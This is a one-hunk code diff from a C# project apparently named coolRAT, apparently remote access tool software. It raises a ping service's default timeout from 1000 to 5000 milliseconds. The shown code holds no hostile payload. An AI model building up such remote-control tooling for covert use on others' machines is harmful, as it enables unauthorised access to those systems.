@@ -29,7 +29,7 @@ namespace coolRAT.Libs.Connections
         public Guid Last_Checksum;
         public PingServiceType Type;
 
-        public PingService(Client ownerClient, int timeoutTime = 1000)
+        public PingService(Client ownerClient, int timeoutTime = 5000)
         {
             OwnerClient = ownerClient ?? throw new ArgumentNullException(nameof(ownerClient));
             TimeoutTime = timeoutTime;
